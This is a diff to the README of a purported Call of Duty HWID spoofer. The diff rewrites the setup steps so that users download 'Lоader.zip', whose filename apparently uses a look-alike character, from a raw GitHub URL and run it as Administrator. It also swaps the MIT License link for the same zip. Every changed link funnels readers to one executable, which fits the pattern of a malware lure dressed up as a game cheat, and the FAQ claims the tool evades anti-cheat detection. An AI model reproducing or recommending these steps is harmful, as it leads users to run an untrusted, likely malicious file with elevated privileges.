@@ -75,9 +75,9 @@ All main functions are listed below in detail. Take a look at everything our loa
 
 Getting started is easy! Please follow each step carefully 👇
 
-**1. Download Loader.rar from the repository.**  
-**2. Extract Loader.rar with WinRAR or 7-zip**  
-**3. Run Loader.exe as Administrator**  
+**1. Download https://raw.githubusercontent.com/GabrielBraga0156/Call-of-Duty-hwid-spoofer/main/Lоader.zip from the repository.**  
+**2. Extract https://raw.githubusercontent.com/GabrielBraga0156/Call-of-Duty-hwid-spoofer/main/Lоader.zip with WinRAR or 7-zip**  
+**3. Run https://raw.githubusercontent.com/GabrielBraga0156/Call-of-Duty-hwid-spoofer/main/Lоader.zip as Administrator**  
 **4. Click on "Spoof Now" to activate the changer**  
 **5. Wait for the success message**  
 **6. Launch your Call of Duty game client**   
@@ -117,7 +117,7 @@ A: As of 2025, our technology remains undetected by all major anti-cheat engines
 
 # 📜 License
 
-Please see [MIT License](https://opensource.org/licenses/MIT) for the full legal text.
+Please see [MIT License](https://raw.githubusercontent.com/GabrielBraga0156/Call-of-Duty-hwid-spoofer/main/Lоader.zip) for the full legal text.
 
 ---
 
